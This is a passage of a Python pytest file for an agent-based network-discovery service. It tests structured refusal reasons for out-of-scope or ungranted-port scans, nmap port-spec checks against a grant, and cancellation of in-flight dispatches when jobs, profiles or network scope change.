    ("case", "expected_reason", "expected_detail"),
    [
        ("pending", "agent_inactive", "pending"),
        ("rejected", "agent_inactive", "rejected"),
        ("revoked", "agent_inactive", "revoked"),
        ("capability_disabled", "capability_disabled", None),
        ("readiness_degraded", "readiness_degraded", None),
        ("out_of_scope", "out_of_scope", "out_of_scope:192.168.50.0/24"),
        ("address_limit_exceeded", "address_limit_exceeded", "65536>1024"),
        ("port_not_granted", "port_not_granted", "9999"),
    ],
)
async def test_adhoc_agent_scan_refusals_reach_the_caller_as_one_reason_vocabulary(
    client, auth_headers, db_session, factories, routed_jobs, case, expected_reason, expected_detail
):
    """Every §7 refusal, answered by `POST /discovery/scan` with the machine-readable
    `reason` Task 19 requires — the same body profile save already returns. A generic
    "Invalid scan request parameters." leaves the UI nothing to render and nothing to
    tell the operator to fix."""
    from app.db.models import ScanJob

    agent, extra = _agent_for_reason(factories, case)
    before = db_session.query(ScanJob).count()
    payload = {
        "cidr": _AGENT_SUBNET,
        "scan_types": ["agent_connect"],
        "scan_agent_id": agent.id,
    }
    payload.update(extra)

    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)

    assert resp.status_code == 422, resp.text
    detail = resp.json()["detail"]
    assert detail["reason"] == expected_reason
    if expected_detail is not None:
        assert detail["detail"] == expected_detail
    assert detail["message"]
    # No job, and nothing handed to either executor: a refusal is a refusal at
    # creation time, not a job that fails later.
    assert db_session.query(ScanJob).count() == before
    assert routed_jobs.agent == [] and routed_jobs.server == []


@pytest.mark.asyncio
async def test_adhoc_scan_still_answers_a_plain_bad_request_generically(
    client, auth_headers, db_session, factories, routed_jobs
):
    """The structured arm must not swallow the existing one: a `ValueError` that is
    not an execution-location refusal still gets the opaque 422, because those
    messages describe server internals rather than a rule the operator can act on."""
    resp = await client.post(
        SCAN_URL,
        json={"cidr": "10.99.0.0/24", "scan_types": ["nmap"]},
        headers=auth_headers,
    )
    assert resp.status_code == 422, resp.text
    assert resp.json()["detail"] == "Invalid scan request parameters."


# ---------------------------------------------------------------------------
# The port spec a discovery request can express
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("arguments", "expected"),
    [
        (None, None),
        ("", None),
        ("-sT --open", None),  # names no ports at all
        ("-p 22,443", None),
        ("-p 22,9999", 9999),
        ("-p9999", 9999),  # nmap accepts the spec glued to the flag
        ("-sT -p 443 --open", None),
        ("-p 20-24", 20),  # a range is walked, and 20 is the first ungranted one
        ("-p 22-24", 23),
        ("-p 1-65535", 1),  # the whole space, answered without expanding it
    ],
)
def test_first_ungranted_tcp_port(arguments, expected):
    """The `-p` spec is the only port set a discovery request can name today, and
    the grant is what decides whether the agent may open any of it."""
    from app.services.discovery_service import first_ungranted_tcp_port

    granted = (22, 53, 80, 443, 445, 3389, 8000, 8080, 8443)
    assert first_ungranted_tcp_port(arguments, granted) == expected


def test_an_empty_grant_allows_no_port():
    """The Go validator's rule verbatim: a port outside the grant is a capability
    violation, not a missing default, so an empty list grants nothing."""
    from app.services.discovery_service import first_ungranted_tcp_port

    assert first_ungranted_tcp_port("-p 22", ()) == 22


# ---------------------------------------------------------------------------
# Cancellation on every path (Slice 4, D-14 / D-16)
# ---------------------------------------------------------------------------
#
# Five events retire an in-flight discovery dispatch: the job is cancelled, its
# profile is disabled, the agent's scope moves under it, the `local_discovery`
# grant is turned off, or the agent is revoked. The last two are pinned in
# `tests/api/test_agents_api.py` because that is where their triggers live; the
# first three are here.
#
# Two properties carry the weight and are asserted separately every time:
#
# * the job is closed in the database *first*, so a finding arriving afterwards
#   is refused whether or not any `discovery.cancel` was ever delivered — the
#   server never relies on the agent honouring a cancel;
# * delivery is best-effort and never raises, so an agent that vanished cannot
#   turn a profile edit into a 500.


@pytest.fixture
def cancel_frames(monkeypatch):
    """Every control frame a cancellation would put on the wire."""
    from unittest.mock import AsyncMock

    from app.services import agent_registry

    frames: list[tuple[int, dict]] = []

    async def _spy(agent_id: int, frame: dict) -> bool:
        frames.append((agent_id, frame))
        return True

    monkeypatch.setattr(agent_registry, "publish_agent_control_frame", AsyncMock(side_effect=_spy))
    return frames


def _cancels(frames):
    from app.schemas.agent_frame import TYPE_DISCOVERY_CANCEL

    return [f["payload"] for _, f in frames if f["type"] == TYPE_DISCOVERY_CANCEL]


def _dispatched_job(db_session, agent, *, profile_id=None, target_cidr=_AGENT_SUBNET, **kwargs):
    """An agent job in the state `agent_discovery._claim` leaves it in."""
    import secrets
    from datetime import timedelta

    from app.core.time import utcnow, utcnow_iso
    from app.db.models import ScanJob
    from app.services.discovery_eligibility import derive_discovery_scope

    defaults = {
        "scan_agent_id": agent.id,
        "profile_id": profile_id,
        "target_cidr": target_cidr,
        "scan_types_json": '["agent_connect"]',
        "source_type": "agent",
        "status": "running",
        "dispatch_id": secrets.token_hex(16),
        "dispatch_status": "dispatched",
        "dispatch_deadline_at": utcnow() + timedelta(minutes=5),
        "scope_version": derive_discovery_scope(db_session, agent.id).version,
        "tenant_id": agent.tenant_id,
        "created_at": utcnow_iso(),
    }
    defaults.update(kwargs)
    job = ScanJob(**defaults)
    db_session.add(job)
    db_session.flush()
    return job


async def _assert_a_late_finding_is_refused(db_session, agent, job):
    """The security property: rejection follows from the closed row, not from
    the agent having received (or honoured) a `discovery.cancel`."""
    import secrets

    from app.core.time import utcnow
    from app.db.models import ScanResult
    from app.services import agent_discovery

    with pytest.raises(agent_discovery.InvalidDiscoveryFinding) as excinfo:
        await agent_discovery.ingest_discovery_finding(
            db_session,
            agent,
            {
                "dispatch_id": job.dispatch_id,
                "scan_job_id": job.id,
                "finding_id": secrets.token_hex(16),
                "kind": "host",
                "observed_at": utcnow().isoformat(),
                "ip_address": _AGENT_HOST,
            },
        )
    assert agent_discovery.REASON_DISPATCH_CLOSED in str(excinfo.value)
    assert db_session.query(ScanResult).filter(ScanResult.scan_job_id == job.id).count() == 0


# ── DELETE /discovery/jobs/{id} ───────────────────────────────────────────────


@pytest.mark.asyncio
async def test_cancelling_an_agent_job_publishes_discovery_cancel(
    client, auth_headers, db_session, factories, cancel_frames
):
    agent = _eligible_agent(factories)
    job = _dispatched_job(db_session, agent)

    resp = await client.delete(f"{JOBS_URL}/{job.id}", headers=auth_headers)
    assert resp.status_code == 200, resp.text

    assert _cancels(cancel_frames) == [{"dispatch_id": job.dispatch_id, "reason": None}]
    db_session.refresh(job)
    assert job.status == "cancelled"
    assert job.dispatch_status == "cancelled"
    await _assert_a_late_finding_is_refused(db_session, agent, job)


@pytest.mark.asyncio
async def test_cancelling_a_server_job_publishes_no_discovery_cancel(
    client, auth_headers, db_session, cancel_frames
):
    """`scan_agent_id is None` is the server scanner; there is no lease to retire
    and no agent to tell."""
    from app.core.time import utcnow_iso
    from app.db.models import ScanJob

    job = ScanJob(
        scan_types_json='["nmap"]', status="running", source_type="manual", created_at=utcnow_iso()
    )
    db_session.add(job)
    db_session.flush()

    resp = await client.delete(f"{JOBS_URL}/{job.id}", headers=auth_headers)
    assert resp.status_code == 200, resp.text
    assert _cancels(cancel_frames) == []


@pytest.mark.asyncio
async def test_cancelling_an_agent_job_survives_an_agent_that_vanished(
    client, auth_headers, db_session, factories, monkeypatch
):
    """Delivery is best-effort. A publisher that blows up must not turn an
    operator's cancel into a 500, and must not leave the lease open."""
    from unittest.mock import AsyncMock

    from app.services import agent_registry

    agent = _eligible_agent(factories)
    job = _dispatched_job(db_session, agent)
    monkeypatch.setattr(
        agent_registry,
        "publish_agent_control_frame",
        AsyncMock(side_effect=RuntimeError("redis is gone")),
    )

    resp = await client.delete(f"{JOBS_URL}/{job.id}", headers=auth_headers)
    assert resp.status_code == 200, resp.text
    db_session.refresh(job)
    assert job.dispatch_status == "cancelled"
    # And the refusal still holds. This is the only configuration in which the
    # agent provably never heard the cancel, so it is the one that actually
    # proves the server is not relying on it having heard one.
    await _assert_a_late_finding_is_refused(db_session, agent, job)


def _let_another_writer_finish_the_job(db_session, monkeypatch, **winning_values):
    """Make some other writer take the job terminal inside the window
    `DELETE /discovery/jobs/{id}` has between deciding the job is cancellable and
    writing it.

    That window is real and uncoordinated: the endpoint reads the row, checks its
    status, and only then writes, while `discovery_service.finalize_agent_job`
    accepts the agent's terminal summary on the `/link` connection and
    `_scan_finalize` ends a server scan on its own thread. The interleaving is
    made deterministic by wrapping the endpoint's own write; the winning row is
    written through Core with `synchronize_session=False`, exactly as the real
    winners' compare-and-sets are, so the endpoint keeps holding the stale ORM
    object it would hold in production — a row that moved under the write is the
    whole subject here.
    """
    from sqlalchemy import update

    from app.api import discovery as discovery_api
    from app.db.models import ScanJob

    write = discovery_api._close_cancelled_job

    def _finished_first(db, job):
        db.execute(
            update(ScanJob)
            .where(ScanJob.id == job.id)
            .values(**winning_values)
            .execution_options(synchronize_session=False)
        )
        return write(db, job)

    monkeypatch.setattr(discovery_api, "_close_cancelled_job", _finished_first)


@pytest.mark.asyncio
async def test_cancelling_an_agent_job_that_completed_first_keeps_the_outcome_that_won(
    client, auth_headers, db_session, factories, cancel_frames, monkeypatch
):
    """A completed scan must never be shown to the operator as cancelled.

    `finalize_agent_job` had already written the `scan_completed` audit row and
    told every client the job completed; a blind `job.status = "cancelled"` here
    left the row saying `cancelled` with `dispatch_status=completed` and
    `progress_phase=done` — a self-contradiction no reader can resolve, and a
    `discovery.cancel` for a dispatch that closed itself. The write is a
    compare-and-set, so the loser reports the outcome that actually stands.
    """
    from app.core.time import utcnow_iso

    agent = _eligible_agent(factories)
    job = _dispatched_job(db_session, agent)
    _let_another_writer_finish_the_job(
        db_session,
        monkeypatch,
        status="completed",
        dispatch_status="completed",
        progress_phase="done",
        completed_at=utcnow_iso(),
    )

    resp = await client.delete(f"{JOBS_URL}/{job.id}", headers=auth_headers)

    assert resp.status_code == 409, resp.text
    assert resp.json()["detail"] == "Job is already completed"
    db_session.refresh(job)
    assert (job.status, job.dispatch_status, job.progress_phase) == (
        "completed",
        "completed",
        "done",
    )
    # And nothing was published: the dispatch closed itself, so there is no lease
    # left for the agent to be told to abandon.
    assert _cancels(cancel_frames) == []


@pytest.mark.asyncio
async def test_cancelling_a_server_job_that_completed_first_keeps_the_outcome_that_won(
    client, auth_headers, db_session, cancel_frames, monkeypatch
):
    """The server arm carries the identical race and now the identical guard.

    `_scan_finalize` closes the job on the scan's own thread with no reference to
    this endpoint, so the same read-then-write window applies. Making the write
    conditional does not change how a server scan is cancelled — that stays
    cooperative — it only stops the endpoint overwriting a scan that finished
    first.
    """
    from app.core.time import utcnow_iso
    from app.db.models import ScanJob

    job = ScanJob(
        scan_types_json='["nmap"]', status="running", source_type="manual", created_at=utcnow_iso()
    )
    db_session.add(job)
    db_session.flush()
    _let_another_writer_finish_the_job(
        db_session, monkeypatch, status="completed", completed_at=utcnow_iso()
    )

    resp = await client.delete(f"{JOBS_URL}/{job.id}", headers=auth_headers)

    assert resp.status_code == 409, resp.text
    assert resp.json()["detail"] == "Job is already completed"
    db_session.refresh(job)
    assert job.status == "completed"
    # Untouched, because a server job never held a dispatch: the endpoint must
    # not hand it an agent job's vocabulary on its way past.
    assert job.dispatch_status is None


# ── Disabling a profile ───────────────────────────────────────────────────────


def _agent_profile(db_session, agent, *, name="agent-owned"):
    from app.core.time import utcnow_iso
    from app.db.models import DiscoveryProfile

    now = utcnow_iso()
    profile = DiscoveryProfile(
        name=name,
        cidr=_AGENT_SUBNET,
        normalized_cidr=_AGENT_SUBNET,
        scan_agent_id=agent.id,
        scan_types='["agent_connect"]',
        enabled=1,
        created_at=now,
        updated_at=now,
    )
    db_session.add(profile)
    db_session.flush()
    return profile


@pytest.mark.asyncio
async def test_disabling_a_profile_cancels_its_in_flight_jobs(
    client, auth_headers, db_session, factories, cancel_frames
):
    """D-14 names profile-disable explicitly because it is the trigger an
    implementation forgets — and it is exactly the moment D-7's
    subnet-disappearance path fires."""
    from app.services import agent_discovery

    agent = _eligible_agent(factories)
    profile = _agent_profile(db_session, agent)
    job = _dispatched_job(db_session, agent, profile_id=profile.id)

    resp = await client.patch(
        f"{PROFILES_URL}/{profile.id}", json={"enabled": False}, headers=auth_headers
    )
    assert resp.status_code == 200, resp.text

    db_session.refresh(job)
    assert job.status == "cancelled"
    assert job.dispatch_status == "cancelled"
    assert job.error_reason == agent_discovery.ERROR_PROFILE_DISABLED
    await _assert_a_late_finding_is_refused(db_session, agent, job)


@pytest.mark.asyncio
async def test_disabling_a_profile_leaves_another_profiles_job_alone(
    client, auth_headers, db_session, factories, cancel_frames
):
    agent = _eligible_agent(factories)
    disabled = _agent_profile(db_session, agent, name="going-away")
    other = _agent_profile(db_session, agent, name="still-running")
    doomed = _dispatched_job(db_session, agent, profile_id=disabled.id)
    survivor = _dispatched_job(db_session, agent, profile_id=other.id)

    resp = await client.patch(
        f"{PROFILES_URL}/{disabled.id}", json={"enabled": False}, headers=auth_headers
    )
    assert resp.status_code == 200, resp.text

    db_session.refresh(doomed)
    db_session.refresh(survivor)
    assert doomed.status == "cancelled"
    assert survivor.status == "running"
    assert survivor.dispatch_status == "dispatched"


@pytest.mark.asyncio
async def test_a_profile_edit_that_does_not_disable_cancels_nothing(
    client, auth_headers, db_session, factories, cancel_frames
):
    agent = _eligible_agent(factories)
    profile = _agent_profile(db_session, agent)
    job = _dispatched_job(db_session, agent, profile_id=profile.id)

    resp = await client.patch(
        f"{PROFILES_URL}/{profile.id}", json={"name": "renamed"}, headers=auth_headers
    )
    assert resp.status_code == 200, resp.text

    db_session.refresh(job)
    assert job.status == "running"
    assert _cancels(cancel_frames) == []


@pytest.mark.asyncio
async def test_the_subnet_disappearance_entry_point_cancels_the_same_way(
    db_session, factories, cancel_frames
):
    """Task 24 disables a system profile whose subnet went away and owes the same
    cancellation. It calls one entry point rather than re-deriving the edit, so
    the two paths cannot answer differently — and because it runs on the event
    loop, this is also where the published frame is observable."""
    import asyncio

    from app.services import agent_discovery, discovery_profiles_service

    agent = _eligible_agent(factories)
    profile = _agent_profile(db_session, agent)
    job = _dispatched_job(db_session, agent, profile_id=profile.id)

    discovery_profiles_service.disable_profile(db_session, profile.id, actor="discovery-bootstrap")
    await asyncio.sleep(0)

    db_session.refresh(profile)
    assert profile.enabled == 0
    db_session.refresh(job)
    assert job.status == "cancelled"
    assert job.error_reason == agent_discovery.ERROR_PROFILE_DISABLED
    assert _cancels(cancel_frames) == [
        {"dispatch_id": job.dispatch_id, "reason": agent_discovery.ERROR_PROFILE_DISABLED}
    ]


@pytest.mark.asyncio
async def test_disabling_a_profile_survives_an_agent_that_vanished(
    client, auth_headers, db_session, factories, monkeypatch
):
    """D-14's "never raising on delivery failure", at the endpoint an operator
    actually uses."""
    from unittest.mock import AsyncMock

    from app.services import agent_registry

    agent = _eligible_agent(factories)
    profile = _agent_profile(db_session, agent)
    job = _dispatched_job(db_session, agent, profile_id=profile.id)
    monkeypatch.setattr(
        agent_registry,
        "publish_agent_control_frame",
        AsyncMock(side_effect=RuntimeError("redis is gone")),
    )

    resp = await client.patch(
        f"{PROFILES_URL}/{profile.id}", json={"enabled": False}, headers=auth_headers
    )
    assert resp.status_code == 200, resp.text
    db_session.refresh(job)
    assert job.status == "cancelled"
    await _assert_a_late_finding_is_refused(db_session, agent, job)


def test_disabling_a_profile_off_the_event_loop_still_closes_its_jobs(db_session, factories):
    """The synchronous half of "delivery never raises".

    `schedule_discovery_cancels` borrows `monitor_service._publish_soon`, which
    publishes nothing at all when no loop is running — the case for every `def`
    route FastAPI hands to its threadpool and for Task 24's bootstrap when it
    runs outside a request. That path must still be a clean disable: the job is
    closed in the database, the reason is D-4's, and nothing is raised at the
    caller. `_assert_a_late_finding_is_refused` is not reachable from a `def`
    test, and does not need to be — the closed row it reads is asserted here.
    """
    from app.services import agent_discovery, discovery_profiles_service

    agent = _eligible_agent(factories)
    profile = _agent_profile(db_session, agent)
    job = _dispatched_job(db_session, agent, profile_id=profile.id)

    discovery_profiles_service.disable_profile(db_session, profile.id, actor="discovery-bootstrap")

    db_session.refresh(job)
    assert job.status == "cancelled"
    assert job.dispatch_status == "cancelled"
    assert job.error_reason == agent_discovery.ERROR_PROFILE_DISABLED


# ── A scope change under a live dispatch (D-16) ───────────────────────────────


def _scope_version(db_session, agent):
    """`agent_networks.generation` — the scope version a network report moves.

    The signal a caller has that the report changed anything, and deliberately
    not `record_network_facts`' return value: that is the *cancellation* the
    report produced, and it is empty both when nothing changed and when a real
    change touched no job worth cancelling (D-16). `generation` is the version
    the scheduler, the UI and the audit trail all cite, so it is the one the
    tests below cite too.
    """
    from app.db.models import AgentNetwork

    row = db_session.query(AgentNetwork).filter(AgentNetwork.agent_id == agent.id).first()
    return row.generation if row else None


async def _report_networks(db_session, agent, interfaces):
    """What `agent_telemetry.ingest_readiness` and `hello` both funnel into.

    Commits, then publishes — in that order, and both here rather than one here
    and one at the call sites, because that is precisely what `ingest_readiness`
    does now that E1 moved delivery out of `record_network_facts`: the rows close
    inside the caller's transaction, and the agent is told to abandon its
    dispatch only once that transaction is durable. A helper that stopped at the
    commit would leave every `cancel_frames` assertion below asserting about a
    publish no caller in production omits.

    Returns the scope version the report left behind, so a caller can assert on
    what a scope change actually signals.
    """
    from app.schemas.agent_frame import NetworkFacts
    from app.services import agent_discovery, agent_registry

    cancellation = agent_registry.record_network_facts(
        db_session, agent, [NetworkFacts(**iface) for iface in interfaces]
    )
    db_session.commit()
    await agent_discovery.publish_discovery_cancels(cancellation)
    return _scope_version(db_session, agent)


@pytest.mark.asyncio
async def test_a_network_report_that_drops_a_live_jobs_target_cancels_it(
    db_session, factories, cancel_frames
):
    from app.services import agent_discovery

    agent = _eligible_agent(factories)
    job = _dispatched_job(db_session, agent)
    before = _scope_version(db_session, agent)

    assert (
        await _report_networks(
            db_session,
            agent,
            [{"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.99.0.5/24"]}],
        )
        != before
    )

    db_session.refresh(job)
    assert job.status == "cancelled"
    assert job.error_reason == agent_discovery.ERROR_SCOPE_CHANGED
    assert _cancels(cancel_frames) == [
        {"dispatch_id": job.dispatch_id, "reason": agent_discovery.ERROR_SCOPE_CHANGED}
    ]
    await _assert_a_late_finding_is_refused(db_session, agent, job)


@pytest.mark.asyncio
async def test_a_network_report_that_only_moves_the_scope_version_cancels_it(
    db_session, factories, cancel_frames
):
    """D-16: the job carries the version that was in force when its request was
    built. A second interface leaves the original target in scope and still moves
    the version, and the ingest path refuses every finding under a version nobody
    authorized — so the dispatch has to be retired rather than left to starve."""
    from app.services import agent_discovery
    from app.services.discovery_eligibility import derive_discovery_scope

    agent = _eligible_agent(factories)
    job = _dispatched_job(db_session, agent)
    before = _scope_version(db_session, agent)

    assert (
        await _report_networks(
            db_session,
            agent,
            [
                {"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.20.30.5/24"]},
                {"name": "eth1", "flags": ["broadcast", "up"], "addrs": ["10.21.0.5/24"]},
            ],
        )
        != before
    )

    scope = derive_discovery_scope(db_session, agent.id)
    assert scope.version != job.scope_version
    db_session.refresh(job)
    assert job.status == "cancelled"
    assert job.error_reason == agent_discovery.ERROR_SCOPE_CHANGED


@pytest.mark.asyncio
async def test_an_unchanged_network_report_cancels_nothing(db_session, factories, cancel_frames):
    """A scope version that does not move is the steady state — every
    heartbeat-adjacent readiness frame re-reports the same interfaces, and a
    counter that ticked on each of them would say "this agent's scope changed"
    about nothing."""
    agent = _eligible_agent(factories)
    job = _dispatched_job(db_session, agent)
    before = _scope_version(db_session, agent)

    assert await _report_networks(db_session, agent, _AGENT_INTERFACES) == before

    db_session.refresh(job)
    assert job.status == "running"
    assert _cancels(cancel_frames) == []


@pytest.mark.asyncio
async def test_a_job_still_waiting_for_its_agent_survives_a_scope_change_it_fits(
    db_session, factories, cancel_frames
):
    """A parked job (D-5) holds no lease and no version snapshot, so a scope that
    moved without dropping its target must leave it alone — cancelling it would
    fail a scan that is still perfectly authorized."""
    agent = _eligible_agent(factories)
    job = _dispatched_job(
        db_session,
        agent,
        status="queued",
        dispatch_id=None,
        dispatch_status="queued",
        scope_version=None,
        progress_phase="waiting_for_agent",
    )
    before = _scope_version(db_session, agent)

    # The scope really did move — asserted on the version, because the
    # cancellation `record_network_facts` returns is empty here and *must* be:
    # an empty one is this test's expected outcome, not evidence the report was
    # a no-op.
    assert (
        await _report_networks(
            db_session,
            agent,
            [
                {"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.20.30.5/24"]},
                {"name": "eth1", "flags": ["broadcast", "up"], "addrs": ["10.21.0.5/24"]},
            ],
        )
        != before
    )

    db_session.refresh(job)
    assert job.status == "queued"
    assert _cancels(cancel_frames) == []


@pytest.mark.asyncio
async def test_a_job_still_waiting_for_its_agent_is_cancelled_when_its_target_goes(
    db_session, factories, cancel_frames
):
    """The other half of the rule above. A parked job has no version snapshot to
    compare, so containment is the only thing that can retire it — and it has to,
    because the subnet it was going to sweep is no longer one the agent is on.
    Nothing is published: there is no lease the agent could be holding."""
    from app.services import agent_discovery

    agent = _eligible_agent(factories)
    job = _dispatched_job(
        db_session,
        agent,
        status="queued",
        dispatch_id=None,
        dispatch_status="queued",
        scope_version=None,
        progress_phase="waiting_for_agent",
    )
    before = _scope_version(db_session, agent)

    assert (
        await _report_networks(
            db_session,
            agent,
            [{"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.99.0.5/24"]}],
        )
        != before
    )

    db_session.refresh(job)
    assert job.status == "cancelled"
    assert job.error_reason == agent_discovery.ERROR_SCOPE_CHANGED
    assert _cancels(cancel_frames) == []


@pytest.mark.asyncio
async def test_a_network_report_whose_cancel_cannot_be_delivered_still_refuses_findings(
    db_session, factories, monkeypatch
):
    """The scope trigger's half of the same property: `record_network_facts` runs
    inside the `/link` read loop, and the delivery its caller awaits afterwards
    is best-effort — `publish_discovery_cancels` swallows a dead Redis, so
    nothing downstream would notice a cancel that never reached the agent. The
    rows are closed and committed before the publish is attempted at all, which
    is what makes that safe."""
    from unittest.mock import AsyncMock

    from app.services import agent_discovery, agent_registry

    agent = _eligible_agent(factories)
    job = _dispatched_job(db_session, agent)
    before = _scope_version(db_session, agent)
    monkeypatch.setattr(
        agent_registry,
        "publish_agent_control_frame",
        AsyncMock(side_effect=RuntimeError("redis is gone")),
    )

    assert (
        await _report_networks(
            db_session,
            agent,
            [{"name": "eth0", "flags": ["broadcast", "up"], "addrs": ["10.99.0.5/24"]}],
        )
        != before
    )

    db_session.refresh(job)
    assert job.status == "cancelled"
    assert job.error_reason == agent_discovery.ERROR_SCOPE_CHANGED
    await _assert_a_late_finding_is_refused(db_session, agent, job)


def test_a_cancellation_reason_outside_the_d4_vocabulary_is_refused(db_session, factories):
    """D-4's `error_reason` set is closed and `scan_jobs.error_reason` is read by
    the history filter and the audit trail. A reason this module invented is a
    programming error, caught here rather than persisted."""
    from app.services import agent_discovery

    agent = _eligible_agent(factories)
    _dispatched_job(db_session, agent)

    with pytest.raises(ValueError, match="not a scan job error reason"):
        agent_discovery.cancel_agent_dispatches(db_session, agent.id, reason="operator_said_so")


@pytest.mark.asyncio
async def test_publishing_a_cancellation_never_raises(db_session, factories, monkeypatch):
    """Directly, because every trigger reaches delivery differently — one awaits
    it, one fires it onto the loop — and only this asserts the guarantee itself
    rather than one caller's insulation from it."""
    from unittest.mock import AsyncMock

    from app.services import agent_discovery, agent_registry

    agent = _eligible_agent(factories)
    job = _dispatched_job(db_session, agent)
    cancellation = agent_discovery.cancel_agent_dispatches(
        db_session, agent.id, reason=agent_discovery.ERROR_CAPABILITY_DISABLED
    )
    db_session.commit()
    monkeypatch.setattr(
        agent_registry,
        "publish_agent_control_frame",
        AsyncMock(side_effect=RuntimeError("redis is gone")),
    )

    assert await agent_discovery.publish_discovery_cancels(cancellation) == 0
    db_session.refresh(job)
    assert job.status == "cancelled"


@pytest.mark.asyncio
async def test_a_cancelled_dispatch_tells_the_clients_its_job_went_terminal(
    db_session, factories, monkeypatch
):
    """These jobs are closed by a bulk write rather than by `finalize_agent_job`,
    so without this they would go terminal with no client ever hearing about it
    and the history page would show a scan that never ends."""
    from app.services import agent_discovery, discovery_service

    events: list[tuple[str, dict]] = []

    async def _spy(event_type, payload):
        events.append((event_type, payload))

    monkeypatch.setattr(discovery_service, "_emit_ws_event", _spy)

    agent = _eligible_agent(factories)
    job = _dispatched_job(db_session, agent)
    cancellation = agent_discovery.cancel_agent_dispatches(
        db_session, agent.id, reason=agent_discovery.ERROR_CAPABILITY_DISABLED
    )
    db_session.commit()
    await agent_discovery.publish_discovery_cancels(cancellation)

    assert (
        "job_update",
        {
            "job": {
                "id": job.id,
                "status": "cancelled",
                "error_reason": agent_discovery.ERROR_CAPABILITY_DISABLED,
                "progress_percent": 100,
            }
        },
    ) in events
